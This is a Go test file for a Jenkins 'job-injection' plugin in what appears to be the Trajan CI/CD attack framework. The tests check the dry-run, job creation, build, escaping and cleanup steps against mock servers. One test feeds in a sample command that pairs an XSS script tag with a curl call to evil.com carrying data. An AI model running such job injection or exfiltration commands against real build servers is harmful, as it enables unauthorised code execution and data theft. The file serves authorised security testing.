package jobinjection

import (
	"context"
	"encoding/json"
	"html"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/praetorian-inc/trajan/pkg/attacks"
	"github.com/praetorian-inc/trajan/pkg/jenkins"
	"github.com/praetorian-inc/trajan/pkg/platforms"
)

func newTestPlatform(t *testing.T, handler http.Handler) *jenkins.Platform {
	t.Helper()
	srv := httptest.NewServer(handler)
	t.Cleanup(srv.Close)
	p := jenkins.NewPlatform()
	err := p.Init(context.Background(), platforms.Config{
		BaseURL: srv.URL,
		Token:   "test-token",
		Jenkins: &platforms.JenkinsAuth{Username: "admin"},
	})
	if err != nil {
		t.Fatalf("failed to init platform: %v", err)
	}
	return p
}

func TestNew(t *testing.T) {
	plugin := New()
	if plugin.Name() != "job-injection" {
		t.Errorf("Name() = %q, want %q", plugin.Name(), "job-injection")
	}
	if plugin.Description() == "" {
		t.Error("Description() should not be empty")
	}
	if plugin.Category() != attacks.CategoryCICD {
		t.Errorf("Category() = %q, want %q", plugin.Category(), attacks.CategoryCICD)
	}
}

func TestExecute_DryRun(t *testing.T) {
	serverCalled := false
	platform := newTestPlatform(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		serverCalled = true
		http.NotFound(w, r)
	}))

	plugin := New()
	result, err := plugin.Execute(context.Background(), attacks.AttackOptions{
		SessionID: "test-session",
		Platform:  platform,
		Payload:   "whoami",
		DryRun:    true,
	})
	if err != nil {
		t.Fatalf("Execute() returned error: %v", err)
	}
	if !result.Success {
		t.Error("dry run should succeed")
	}
	if !strings.Contains(result.Message, "DRY RUN") {
		t.Errorf("message %q should mention DRY RUN", result.Message)
	}

	data, ok := result.Data.(map[string]interface{})
	if !ok {
		t.Fatal("result.Data should be a map")
	}
	jobName, ok := data["job_name"].(string)
	if !ok || jobName == "" {
		t.Error("dry run data should include non-empty 'job_name'")
	}
	configXML, ok := data["config_xml"].(string)
	if !ok || configXML == "" {
		t.Error("dry run data should include 'config_xml'")
	}

	// Verify cleanup actions are included in dry run
	if len(result.CleanupActions) == 0 {
		t.Error("dry run should include cleanup actions")
	}
	if len(result.Artifacts) == 0 {
		t.Error("dry run should include artifacts")
	}
	if serverCalled {
		t.Error("dry run should not call the server")
	}
}

func TestExecute_Success(t *testing.T) {
	var (
		createCalled  bool
		buildCalled   bool
		consoleCalled bool
	)

	platform := newTestPlatform(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.URL.Path == "/crumbIssuer/api/json":
			w.WriteHeader(http.StatusNotFound) // CSRF disabled
		case r.URL.Path == "/createItem" && r.Method == "POST":
			createCalled = true
			w.WriteHeader(http.StatusOK)
		case strings.HasSuffix(r.URL.Path, "/build") && r.Method == "POST":
			buildCalled = true
			w.WriteHeader(http.StatusOK)
		case strings.HasSuffix(r.URL.Path, "/lastBuild/api/json"):
			info := jenkins.BuildInfo{
				Number: 1,
				Result: "SUCCESS",
			}
			json.NewEncoder(w).Encode(info)
		case strings.HasSuffix(r.URL.Path, "/consoleText"):
			consoleCalled = true
			w.Write([]byte("Build output here"))
		default:
			http.NotFound(w, r)
		}
	}))

	plugin := New()
	result, err := plugin.Execute(context.Background(), attacks.AttackOptions{
		SessionID: "test-session",
		Platform:  platform,
		Payload:   "id",
		DryRun:    false,
	})
	if err != nil {
		t.Fatalf("Execute() returned error: %v", err)
	}
	if !result.Success {
		t.Errorf("expected success, got message: %s", result.Message)
	}
	if !createCalled {
		t.Error("expected createItem to be called")
	}
	if !buildCalled {
		t.Error("expected build trigger to be called")
	}
	if !consoleCalled {
		t.Error("expected consoleText to be called")
	}

	data, ok := result.Data.(map[string]interface{})
	if !ok {
		t.Fatal("result.Data should be a map")
	}
	if data["build_result"] != "SUCCESS" {
		t.Errorf("build_result = %v, want SUCCESS", data["build_result"])
	}
}

func TestExecute_XMLEscaping(t *testing.T) {
	// Security-critical: verify command with <>&" chars produces valid XML
	var receivedBody string
	platform := newTestPlatform(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.URL.Path == "/crumbIssuer/api/json":
			w.WriteHeader(http.StatusNotFound)
		case r.URL.Path == "/createItem" && r.Method == "POST":
			buf := make([]byte, 4096)
			n, _ := r.Body.Read(buf)
			receivedBody = string(buf[:n])
			w.WriteHeader(http.StatusOK)
		case strings.HasSuffix(r.URL.Path, "/build"):
			w.WriteHeader(http.StatusOK)
		case strings.HasSuffix(r.URL.Path, "/lastBuild/api/json"):
			info := jenkins.BuildInfo{Number: 1, Result: "SUCCESS"}
			json.NewEncoder(w).Encode(info)
		case strings.HasSuffix(r.URL.Path, "/consoleText"):
			w.Write([]byte("ok"))
		default:
			http.NotFound(w, r)
		}
	}))

	dangerousCmd := `echo "<script>alert('xss')</script>" && curl http://evil.com?data="test"`
	plugin := New()
	_, err := plugin.Execute(context.Background(), attacks.AttackOptions{
		SessionID: "test-session",
		Platform:  platform,
		Payload:   dangerousCmd,
		DryRun:    false,
	})
	if err != nil {
		t.Fatalf("Execute() returned error: %v", err)
	}

	// Verify html.EscapeString is applied: < becomes &lt;, > becomes &gt;, etc.
	escaped := html.EscapeString(dangerousCmd)
	if !strings.Contains(receivedBody, escaped) {
		t.Errorf("XML body should contain html-escaped command.\nGot body: %s\nExpected to contain: %s", receivedBody, escaped)
	}
	// Make sure the raw dangerous chars are NOT in the <command> element
	if strings.Contains(receivedBody, "<script>") {
		t.Error("XML body should not contain unescaped <script> tag")
	}
}

func TestExecute_NoPayloadNoCommand(t *testing.T) {
	platform := newTestPlatform(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.NotFound(w, r)
	}))

	plugin := New()
	_, err := plugin.Execute(context.Background(), attacks.AttackOptions{
		SessionID: "test-session",
		Platform:  platform,
		DryRun:    false,
	})
	if err == nil {
		t.Fatal("expected error when no payload and no command provided")
	}
	if !strings.Contains(err.Error(), "must provide") {
		t.Errorf("error message %q should mention 'must provide'", err.Error())
	}
}

func TestCleanup(t *testing.T) {
	deleteCalled := false
	platform := newTestPlatform(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.URL.Path == "/crumbIssuer/api/json":
			w.WriteHeader(http.StatusNotFound)
		case strings.HasSuffix(r.URL.Path, "/doDelete") && r.Method == "POST":
			deleteCalled = true
			w.WriteHeader(http.StatusOK)
		default:
			http.NotFound(w, r)
		}
	}))

	plugin := New()
	session := &attacks.Session{
		Platform: platform,
		Results: []*attacks.AttackResult{
			{
				Plugin: "job-injection",
				CleanupActions: []attacks.CleanupAction{
					{
						Type:       attacks.ArtifactWorkflow,
						Identifier: "trajan-attack-test",
						Action:     "delete",
					},
				},
			},
		},
	}

	err := plugin.Cleanup(context.Background(), session)
	if err != nil {
		t.Fatalf("Cleanup() returned error: %v", err)
	}
	if !deleteCalled {
		t.Error("expected doDelete endpoint to be called")
	}
}

func TestCleanup_SkipsOtherPlugins(t *testing.T) {
	deleteCalled := false
	platform := newTestPlatform(t, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.URL.Path == "/crumbIssuer/api/json":
			w.WriteHeader(http.StatusNotFound)
		case strings.HasSuffix(r.URL.Path, "/doDelete"):
			deleteCalled = true
			w.WriteHeader(http.StatusOK)
		default:
			http.NotFound(w, r)
		}
	}))

	plugin := New()
	session := &attacks.Session{
		Platform: platform,
		Results: []*attacks.AttackResult{
			{
				Plugin: "other-plugin",
				CleanupActions: []attacks.CleanupAction{
					{
						Type:       attacks.ArtifactWorkflow,
						Identifier: "some-job",
						Action:     "delete",
					},
				},
			},
		},
	}

	err := plugin.Cleanup(context.Background(), session)
	if err != nil {
		t.Fatalf("Cleanup() returned error: %v", err)
	}
	if deleteCalled {
		t.Error("should not delete jobs from other plugins")
	}
}
